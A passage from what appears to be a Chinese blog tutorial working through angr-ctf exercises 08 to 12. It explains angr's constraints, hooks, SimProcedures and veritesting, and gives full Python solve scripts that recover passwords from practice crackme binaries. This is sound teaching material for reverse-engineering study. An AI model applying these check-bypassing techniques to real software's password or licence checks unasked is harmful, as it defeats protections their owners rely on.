类型的对象直接表示了对应的式子，因此可以作为<strong>约束条件</strong>被添加到一个状态当中，我们可以通过 <code>state.solver.add()</code> 为对应状态添加约束：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>state.solver.add(bvs == bvv + bvv2)<br><span class="hljs-meta">&gt;&gt;&gt; </span>state.solver.add(bvs2 &gt; bvs * bvv + bvv2)<br><span class="hljs-meta">&gt;&gt;&gt; </span>state.solver.<span class="hljs-built_in">eval</span>(bvs2) <span class="hljs-comment"># get the concrete value under constraints</span><br></code></pre></td></tr></table></figure><p>除了 Bool 类以外，Claripy 还提供了一些以位向量作为结果的运算操作，以下是一个🌰（完整的还是去读<a href="https://docs.angr.io/advanced-topics/claripy">文档</a>吧）：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>claripy.If(bvs == bvs2, bvs, bvs2)<br>&lt;BV32 <span class="hljs-keyword">if</span> bvs_0_32 == bvs2_1_32 then bvs_0_32 <span class="hljs-keyword">else</span> bvs2_1_32&gt;<br></code></pre></td></tr></table></figure><h3 id="FINAL-EXPLOIT-4"><a href="#FINAL-EXPLOIT-4" class="headerlink" title="FINAL EXPLOIT"></a>FINAL EXPLOIT</h3><p>由于待比较字符串是固定的，故我们可以让 <code>explore()</code> 在完成对输入的变换后、在进入比较函数之前停下，之后直接为该状态手动添加一个对应的约束后进行求解即可</p><p>这里添加约束的方法是使用 <code>state.memory.load(addr, size_in_bytes)</code> 成员函数将当前状态的某个内存区域作为一个 BVS 提取出来，之后通过 <code>state.add_constraints(condition)</code> 添加约束指定该块内存在当前状态下的值为特定字符串，最后使用 <code>state.solver.eval()</code> 求解原来的 buffer 即可</p><p>最终的解题脚本如下，详见注释：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> angr<br><span class="hljs-keyword">import</span> claripy<br><span class="hljs-keyword">import</span> sys<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">solver</span>():<br>    bin_file = <span class="hljs-string">&#x27;./08_angr_constraints&#x27;</span><br>    proj = angr.Project(bin_file)<br>    start_addr = <span class="hljs-number">0x804935D</span> <span class="hljs-comment"># first insn after scanf()</span><br>    init_state = proj.factory.blank_state(addr = start_addr)<br><br>    <span class="hljs-comment"># BVS for buffer</span><br>    buffer_addr = <span class="hljs-number">0x804C040</span><br>    buffer_size = <span class="hljs-number">0x10</span><br>    buffer = claripy.BVS(<span class="hljs-string">&#x27;buffer&#x27;</span>, buffer_size * <span class="hljs-number">8</span>)<br>    init_state.memory.store(buffer_addr, buffer)<br><br>    <span class="hljs-comment"># explore to check_equals()</span><br>    check_addr = <span class="hljs-number">0x80493A9</span> <span class="hljs-comment"># last insn before call check_equals() </span><br>    simgr = proj.factory.simgr(init_state)<br>    simgr.explore(find = check_addr)<br>    check_state = simgr.found[<span class="hljs-number">0</span>]<br><br>    <span class="hljs-comment"># get the buffer BVS of check_state</span><br>    password = check_state.memory.load(buffer_addr, buffer_size)<br>    compared_str = <span class="hljs-string">&quot;EFJLFOGMURLEVNXN&quot;</span><br><br>    <span class="hljs-comment"># add and solve the constraints</span><br>    check_state.add_constraints(password == compared_str)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;password: &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(check_state.solver.<span class="hljs-built_in">eval</span>(buffer, cast_to=<span class="hljs-built_in">bytes</span>)))<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    solver()<br></code></pre></td></tr></table></figure><p>还是秒解：</p><p><img src="https://s2.loli.net/2022/11/01/Lh5YzU3RPyD2ZTW.png" alt="image.png"></p><h1 id="0x04-angr-ctf：函数操作"><a href="#0x04-angr-ctf：函数操作" class="headerlink" title="0x04. angr-ctf：函数操作"></a>0x04. angr-ctf：函数操作</h1><h2 id="09-angr-hooks：函数替换"><a href="#09-angr-hooks：函数替换" class="headerlink" title="09_angr_hooks：函数替换"></a>09_angr_hooks：函数替换</h2><p>惯例拖入 IDA，程序大概的主体逻辑是读入 buffer 后经过 <code>complex_function()</code> 运算，之后通过 <code>check_equals()</code> 与 password 进行对比并把结果存到 <code>equals</code> 变量当中；之后将 password 经过 <code>complex_function()</code> 运算，随后再读入 buffer 与 password 进行对比；两个条件都符合了才会输出 <code>&quot;Good Job.&quot;</code> </p><p>其中 <code>0x804C044</code> 就是 buffer 的地址，<code>0x804C034</code> 就是 password 的地址</p><p><img src="https://s2.loli.net/2022/11/02/sIjxptNAr7ZCeuo.png" alt="image.png"></p><p>其中 <code>check_equals()</code> 逻辑比较简单，就算简单的与 password 进行对比，不过由于是<strong>逐字符对比</strong>后增加统计数量，因此会导致<strong>路径爆炸</strong>：</p><p><img src="https://s2.loli.net/2022/11/02/5NAMaSsoHVZ4geL.png" alt="image.png"></p><p>如果是像 02 那样直接求解，<code>check_equals()</code> 带来的路径爆炸会非常令人头大，而该函数的功能本质上就仅是与一个字符串进行对比，因此我们可以<strong>使用 angr 来 hook 掉该函数，自行实现等价的操作函数</strong></p><h3 id="project-hook-函数钩子"><a href="#project-hook-函数钩子" class="headerlink" title="project.hook() - 函数钩子"></a>project.hook() - 函数钩子</h3><p>有的时候我们会有需要 hook 掉某个函数的需求，此时我们可以使用 <code>project.hook(addr = call_insn_addr, hook = my_function, length = n)</code> 来 hook 掉对应的 call 指令，其中 <code>call_insn_addr</code> 为 call 指令的地址，<code>my_function</code> 为我们的自定义函数， <code>length</code> 为 call 指令的长度：</p><p><img src="https://s2.loli.net/2022/11/02/Y5ptBU8oAsTdj7c.png" alt="image.png"></p><p>我们的自定义函数应当为接收 <code>state</code> 作为参数的函数，angr 还提供了 decorator 语法糖，因此以下两种写法都可以：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># method 1</span><br><span class="hljs-meta">@project.hook(<span class="hljs-params"><span class="hljs-number">0x1234</span>, length=<span class="hljs-number">5</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">my_hook_func</span>(<span class="hljs-params">state</span>):<br>    <span class="hljs-comment"># do something, this is an example</span><br>    state.regs.eax = <span class="hljs-number">0xdeadbeef</span><br><br><span class="hljs-comment"># method 2</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">my_hook_func2</span>(<span class="hljs-params">state</span>):<br>    <span class="hljs-comment"># do something, this is an example</span><br>    state.regs.eax = <span class="hljs-number">0xdeadbeef</span><br>proj.hook(addr = <span class="hljs-number">0x5678</span>, hook = my_hook_func2, length = <span class="hljs-number">5</span>)<br></code></pre></td></tr></table></figure><h3 id="FINAL-EXPLOIT-5"><a href="#FINAL-EXPLOIT-5" class="headerlink" title="FINAL EXPLOIT"></a>FINAL EXPLOIT</h3><p>因此本题我们只需要 hook 掉比较函数便能解决路径爆炸的问题，我们使用 <code>claripy.If()</code> 创建一个比较并将值给到 eax 寄存器作为返回值，最后就是常规的内存符号化后求解即可，最终的求解脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> angr<br><span class="hljs-keyword">import</span> claripy<br><span class="hljs-keyword">import</span> sys<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">solver</span>():<br>    bin_path = <span class="hljs-string">&#x27;./09_angr_hooks&#x27;</span><br>    proj = angr.Project(bin_path)<br><br>    buffer_addr = <span class="hljs-number">0x804C044</span><br>    buffer_size = <span class="hljs-number">0x10</span><br>    compared_str = <span class="hljs-string">b&#x27;XFQUUEQFKBECVEJF&#x27;</span><br><br>    start_addr = <span class="hljs-number">0x804937D</span> <span class="hljs-comment"># first insn after first scanf()</span><br>    init_state = proj.factory.blank_state(addr = start_addr)<br><br>    buffer = claripy.BVS(<span class="hljs-string">&#x27;buffer&#x27;</span>, buffer_size * <span class="hljs-number">8</span>)<br>    init_state.memory.store(buffer_addr, buffer)<br><br>    <span class="hljs-comment"># because we have passed the qmemcpy() that initial the password&#x27;s memory,</span><br>    <span class="hljs-comment"># so we need to do it manually</span><br>    password_size = <span class="hljs-number">0x10</span><br>    password_addr = <span class="hljs-number">0x804C034</span><br>    init_state.memory.store(password_addr,<br>                            claripy.BVV(<span class="hljs-built_in">int</span>.from_bytes(compared_str, <span class="hljs-string">&quot;big&quot;</span>), <br>                                        password_size * <span class="hljs-number">8</span>))<br><br><span class="hljs-meta">    @proj.hook(<span class="hljs-params">addr = <span class="hljs-number">0x80493CE</span>, length = <span class="hljs-number">5</span></span>)</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">my_hook_func</span>(<span class="hljs-params">state</span>):<br>        buffer = state.memory.load(buffer_addr, buffer_size)<br>        <span class="hljs-comment"># eax is used for return val</span><br>        state.regs.eax = claripy.If(buffer == compared_str, <span class="hljs-comment"># constraint</span><br>                                    <span class="hljs-comment"># if success, return 1, else return 0</span><br>                                    claripy.BVV(<span class="hljs-number">1</span>, <span class="hljs-number">32</span>), claripy.BVV(<span class="hljs-number">0</span>, <span class="hljs-number">32</span>))<br><br>    simgr = proj.factory.simgr(init_state)<br>    simgr.explore(find = <span class="hljs-number">0x80493D3</span>) <span class="hljs-comment"># first insn after my_hook_func() returned</span><br><br>    check_state = simgr.found[<span class="hljs-number">0</span>]<br>    check_state.add_constraints(check_state.regs.eax == <span class="hljs-number">1</span>) <span class="hljs-comment"># constraint for eval == 1</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;password0: &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(check_state.solver.<span class="hljs-built_in">eval</span>(buffer, cast_to=<span class="hljs-built_in">bytes</span>)))<br><br>    <span class="hljs-comment"># now we need to calculate the password&#x27;s val after complex()</span><br>    simgr2 = proj.factory.simgr(check_state)<br>    simgr2.explore(find = <span class="hljs-number">0x8049428</span>) <span class="hljs-comment"># last insn before second scanf()</span><br><br>    check_state2 = simgr2.found[<span class="hljs-number">0</span>]<br>    password = check_state2.memory.load(password_addr, password_size)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;password1: &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(check_state2.solver.<span class="hljs-built_in">eval</span>(password, cast_to=<span class="hljs-built_in">bytes</span>)))<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    solver()<br></code></pre></td></tr></table></figure><p>还是秒解：</p><p><img src="https://s2.loli.net/2022/11/02/xHpXA6WNqwisaLT.png" alt="image.png"></p><blockquote><p>当然，还有一种更加简洁的写法就是 hook 掉 <code>check_equals()</code> 之后直接从 <code>entry_state</code> 开始 explore() 到输出 <code>&quot;Good Job.&quot;</code> ，但笔者在刚开始写的时候是没想到的…</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> angr<br><span class="hljs-keyword">import</span> claripy<br><span class="hljs-keyword">import</span> sys<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">find_path</span>(<span class="hljs-params">state</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;Good Job.&#x27;</span> <span class="hljs-keyword">in</span> state.posix.dumps(sys.stdout.fileno())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">avoid_path</span>(<span class="hljs-params">state</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;Try again.&#x27;</span> <span class="hljs-keyword">in</span> state.posix.dumps(sys.stdout.fileno())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">solver</span>():<br>    bin_path = <span class="hljs-string">&#x27;./09_angr_hooks&#x27;</span><br>    proj = angr.Project(bin_path)<br><br>    buffer_addr = <span class="hljs-number">0x804C044</span><br>    buffer_size = <span class="hljs-number">0x10</span><br>    compared_str = <span class="hljs-string">b&#x27;XFQUUEQFKBECVEJF&#x27;</span><br><br>    init_state = proj.factory.entry_state()<br><br><span class="hljs-meta">    @proj.hook(<span class="hljs-params">addr = <span class="hljs-number">0x80493CE</span>, length = <span class="hljs-number">5</span></span>)</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">my_hook_func</span>(<span class="hljs-params">state</span>):<br>        buffer = state.memory.load(buffer_addr, buffer_size)<br>        <span class="hljs-comment"># rax is used for return val</span><br>        state.regs.eax = claripy.If(buffer == compared_str, <span class="hljs-comment"># constraint</span><br>                                    <span class="hljs-comment"># if success, return 1, else return 0</span><br>                                    claripy.BVV(<span class="hljs-number">1</span>, <span class="hljs-number">32</span>), claripy.BVV(<span class="hljs-number">0</span>, <span class="hljs-number">32</span>))<br><br>    simgr = proj.factory.simgr(init_state)<br>    simgr.explore(find = find_path, avoid = avoid_path)<br><br>    <span class="hljs-keyword">if</span> simgr.found:<br>        solution_state = simgr.found[<span class="hljs-number">0</span>]<br>        <span class="hljs-built_in">print</span>(solution_state.posix.dumps(sys.stdin.fileno()))<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&#x27;Could not find the solution!&#x27;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    solver()<br></code></pre></td></tr></table></figure></blockquote><h2 id="10-angr-simprocedures：模拟过程调用"><a href="#10-angr-simprocedures：模拟过程调用" class="headerlink" title="10_angr_simprocedures：模拟过程调用"></a>10_angr_simprocedures：模拟过程调用</h2><p>惯例拖入 IDA ，这一次的伪代码还是一坨史所以直接看汇编，可以看到虽然还是惯例的 <code>complex_function()</code> 对输入进行处理后使用 <code>check_equals()</code> 进行路径爆炸的逐字符比较，但不同的是这一次多了许多的伪路径：</p><p><img src="https://s2.loli.net/2022/11/02/rj5ThAGsOeql9FP.png" alt="image.png"></p><p>而每个伪路径后面都对应着一个路径爆炸的 <code>check_equals()</code> ：</p><p><img src="https://s2.loli.net/2022/11/02/pLiH6FYE1DJfrc9.png" alt="image.png"></p><p>如果我们对于每个伪路径后边的基本块都手动进行 hook，那未免也过于麻烦，因此这一次我们可以利用 angr 直接通过函数符号来 hook 掉 <code>check_equals()</code> 函数</p><h3 id="angr-SimProcedure-模拟函数（过程）"><a href="#angr-SimProcedure-模拟函数（过程）" class="headerlink" title="angr.SimProcedure - 模拟函数（过程）"></a>angr.SimProcedure - 模拟函数（过程）</h3><p>在 angr 中 <code>angr.SimProcedure</code> 类用来表示<strong>在一个状态上的一个运行过程</strong>——即函数实际上是一个 SimPrecedure</p><p>我们可以通过创建一个继承自 <code>angr.SimProcedure</code> 的类并重写 <code>run()</code> 方法的方式来表示一个自定义函数，其中 <code>run()</code> 方法的参数为该函数所接收的参数：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">MyProcedure</span>(angr.SimProcedure):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">run</span>(<span class="hljs-params">self, arg1, arg2</span>):<br>        <span class="hljs-comment"># do something, this&#x27;s an example</span><br>        <span class="hljs-keyword">return</span> self.state.memory.load(arg1, arg2)<br></code></pre></td></tr></table></figure><p>自定义函数过程主要用于对文件中的原有函数进行替换，例如 angr 缺省会用内置的一些 SimProcedure 来替换掉一些库函数<br>若我们已经有该二进制文件的符号表，我们可以直接使用 <code>project.hook_symbol(symbol_str, sim_procedure_instance)</code> 来自动 hook 掉文件中所有的对应符号，其中 <code>run()</code> 方法的<strong>参数为被替换函数所接收的参数</strong>，这是一个🌰：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python3">import angr<br>import claripy<br><br>class MyProcedure(angr.SimProcedure):<br>    def run(self, arg1, arg2):<br>        # do something, this&#x27;s an example<br>        return self.state.memory.load(arg1, arg2)<br><br>proj = angr.Project(&#x27;./test&#x27;)<br>proj.hook_symbol(&#x27;func_to_hook&#x27;, MyProcedure())<br></code></pre></td></tr></table></figure><p>当然，在 SimProcedure 的 <code>run()</code> 过程中我们也可以使用一些有用的成员函数：</p><ul><li><code>ret(expr)</code>: 函数返回</li><li><code>jump(addr)</code>: 跳转到指定地址</li><li><code>exit(code)</code>: 终止程序</li><li><code>call(addr, args, continue_at)</code>: 调用文件中的函数</li><li><code>inline_call(procedure, *args)</code>: 内联地调用另一个 SimProcedure</li></ul><h3 id="FINAL-EXPLOIT-6"><a href="#FINAL-EXPLOIT-6" class="headerlink" title="FINAL EXPLOIT"></a>FINAL EXPLOIT</h3><p>那么这里我们只需要将该符号直接替换成我们的自定义比较函数即可，因此最终的写法如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs python3">import angr<br>import claripy<br>import sys<br><br>class MyRelacementHookProcedure(angr.SimProcedure):<br>    def run(self, buffer_addr, buffer_len):<br>        buffer = self.state.memory.load(buffer_addr, buffer_len)<br>        compared_str = b&#x27;XFQUUEQFKBECVEJF&#x27;<br>        return claripy.If(buffer == compared_str, claripy.BVV(1, 32), claripy.BVV(0, 32))<br><br>def find_path(state):<br>    return b&#x27;Good Job.&#x27; in state.posix.dumps(sys.stdout.fileno())<br><br>def avoid_path(state):<br>    return b&#x27;Try again.&#x27; in state.posix.dumps(sys.stdout.fileno())<br><br>def solver():<br>    bin_path = &#x27;./10_angr_simprocedures&#x27;<br>    proj = angr.Project(bin_path)<br>    init_state = proj.factory.entry_state()<br><br>    # hook the check_equals()<br>    proj.hook_symbol(&#x27;check_equals_XFQUUEQFKBECVEJF&#x27;, MyRelacementHookProcedure())<br><br>    simgr = proj.factory.simgr(init_state)<br>    simgr.explore(find = find_path, avoid = avoid_path)<br><br>    if simgr.found:<br>        solution_state = simgr.found[0]<br>        print(solution_state.posix.dumps(sys.stdin.fileno()))<br>    else:<br>        raise Exception(&#x27;Could not find the solution&#x27;)<br><br>if __name__ == &#x27;__main__&#x27;:<br>    solver()<br></code></pre></td></tr></table></figure><p>还是秒解：</p><p><img src="https://s2.loli.net/2022/11/03/1GntXiVluADdbRs.png" alt="image.png"></p><h2 id="11-angr-sim-scanf：模拟-scanf"><a href="#11-angr-sim-scanf：模拟-scanf" class="headerlink" title="11_angr_sim_scanf：模拟 scanf"></a>11_angr_sim_scanf：模拟 scanf</h2><p>惯例拖进 IDA，提示 graph is too big</p><p><img src="https://s2.loli.net/2022/11/03/epOU2j6iDcyZutL.png" alt="image.png"></p><p>看一下反汇编，可以发现这一次是在 <code>scanf()</code> 前面有很多伪分支：</p><p><img src="https://s2.loli.net/2022/11/03/LP97x2dUXNjTsKz.png" alt="image.png"></p><p>这些伪分支的导向都是以 <code>scanf()</code> 开头的基本块，可以看到的是其都使用 <code>%u %u</code> 来读入两个四字节无符号数后使用 <code>strncmp()</code> 与 8 字节的字符串进行对比</p><p><img src="https://s2.loli.net/2022/11/03/d4GlDOc7TANCZMS.png" alt="image.png"></p><p>在最开始还有 <code>complex_function()</code> 处理待比较的源字符串，还是老样子就不进去看了：</p><p><img src="https://s2.loli.net/2022/11/03/v8bZzJgAPOpG7K4.png" alt="image.png"></p><p>那么这题的结构和 02 其实是基本上一样的，只不过 <code>scanf()</code> 被移到了伪分支基本块中，因此用 02 的解题脚本依然可以秒解，但这样就不是我们做题的目的了：）</p><p>本题实际上算是对上一题的扩展，由于我们已知对 <code>scanf()</code> 的调用会读入两个数值，我们可以直接实现一个 SimProcedure 来模拟该过程，而不需要再走 <code>scanf()</code> 内部的复杂路径</p><p>这里我们若是在 <code>run()</code> 方法内创建 BVS ，则可以通过将其储存到 <code>state.globals</code> 列表的方式以便后续取用</p><p>因此最后的解题脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> angr<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> claripy<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">MyScanfProcedure</span>(angr.SimProcedure):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">run</span>(<span class="hljs-params">self, fmt_str, buffer0_addr, buffer1_addr</span>):<br>        buffer0 = claripy.BVS(<span class="hljs-string">&#x27;buffer0&#x27;</span>, <span class="hljs-number">4</span> * <span class="hljs-number">8</span>) <span class="hljs-comment"># 4 bytes</span><br>        buffer1 = claripy.BVS(<span class="hljs-string">&#x27;buffer1&#x27;</span>, <span class="hljs-number">4</span> * <span class="hljs-number">8</span>) <span class="hljs-comment"># 4 bytes</span><br>        self.state.memory.store(buffer0_addr, buffer0)<br>        self.state.memory.store(buffer1_addr, buffer1)<br>        self.state.<span class="hljs-built_in">globals</span>[<span class="hljs-string">&#x27;buffer0&#x27;</span>] = buffer0<br>        self.state.<span class="hljs-built_in">globals</span>[<span class="hljs-string">&#x27;buffer1&#x27;</span>] = buffer1<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">find_path</span>(<span class="hljs-params">state</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;Good Job.&#x27;</span> <span class="hljs-keyword">in</span> state.posix.dumps(sys.stdout.fileno())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">avoid_path</span>(<span class="hljs-params">state</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;Try again.&#x27;</span> <span class="hljs-keyword">in</span> state.posix.dumps(sys.stdout.fileno())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">solver</span>():<br>    bin_path = <span class="hljs-string">&#x27;./11_angr_sim_scanf&#x27;</span><br>    proj = angr.Project(bin_path)<br>    init_state = proj.factory.entry_state()<br>    proj.hook_symbol(<span class="hljs-string">&#x27;__isoc99_scanf&#x27;</span>, MyScanfProcedure())<br>    <br>    simgr = proj.factory.simgr(init_state)<br>    simgr.explore(find = find_path, avoid = avoid_path)<br><br>    <span class="hljs-keyword">if</span> simgr.found:<br>        solution_state = simgr.found[<span class="hljs-number">0</span>]<br>        buffer0 = solution_state.<span class="hljs-built_in">globals</span>[<span class="hljs-string">&#x27;buffer0&#x27;</span>]<br>        buffer1 = solution_state.<span class="hljs-built_in">globals</span>[<span class="hljs-string">&#x27;buffer1&#x27;</span>]<br>        password0 = solution_state.solver.<span class="hljs-built_in">eval</span>(buffer0, cast_to=<span class="hljs-built_in">bytes</span>)<br>        password1 = solution_state.solver.<span class="hljs-built_in">eval</span>(buffer1, cast_to=<span class="hljs-built_in">bytes</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;password0: &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">int</span>.from_bytes(password0, <span class="hljs-string">&#x27;little&#x27;</span>)))<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;password1: &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">int</span>.from_bytes(password1, <span class="hljs-string">&#x27;little&#x27;</span>)))<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&#x27;Could not find the solution&#x27;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    solver()<br></code></pre></td></tr></table></figure><p>还是秒解：</p><p><img src="https://s2.loli.net/2022/11/03/pCsdR9Gckawg2Zm.png" alt="image.png"></p><h1 id="0x05-angr-ctf：路径合并"><a href="#0x05-angr-ctf：路径合并" class="headerlink" title="0x05. angr-ctf：路径合并"></a>0x05. angr-ctf：路径合并</h1><h2 id="12-angr-veritesting：路径合并"><a href="#12-angr-veritesting：路径合并" class="headerlink" title="12_angr_veritesting：路径合并"></a>12_angr_veritesting：路径合并</h2><p>惯例拖入 IDA，不知道为啥 IDA 反编译出来一坨史所以直接看汇编，在读入输入后来到的红框里是一个循环  <code>for (int i = 0; i &lt;= 0x1F; i++)</code> ，每轮循环都会计算 <code>complex_function(&#39;X&#39;, i + &#39;V&#39;)</code> 并将结果与 <code>input[i]</code> 对比，全部相等才能通过</p><p><img src="https://s2.loli.net/2022/11/04/WaUX8uEwyiMeJFs.png" alt="image.png"></p><p>当然如果当作常规的逆向题来做的话解题脚本很快就能写好了，但这不是我们做题的目的：）</p><p>这题看起来和第一题差不多，由但其逐字符比较增加计数的写法会导致路径爆炸的问题，因此我们需要进行 <strong>路径合并</strong> ，这里我们可以直接在创建 simgr 时指定参数 <code>veritesting=True</code>，这样 angr 